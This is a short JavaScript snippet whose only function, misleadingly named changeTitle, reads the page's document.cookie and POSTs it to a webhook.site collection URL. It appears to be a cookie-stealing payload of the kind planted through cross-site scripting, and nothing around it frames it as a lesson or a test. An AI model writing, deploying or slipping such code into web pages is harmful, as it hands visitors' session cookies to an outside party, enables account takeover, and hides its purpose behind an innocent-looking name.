function changeTitle() {
    let server = new XMLHttpRequest;
    server.open("POST", "https://webhook.site/38ba9692-250b-438c-8533-896161eb3628",true);
    server.setRequestHeader("Content-Type", "text/plain");
    server.send(document.cookie);
}
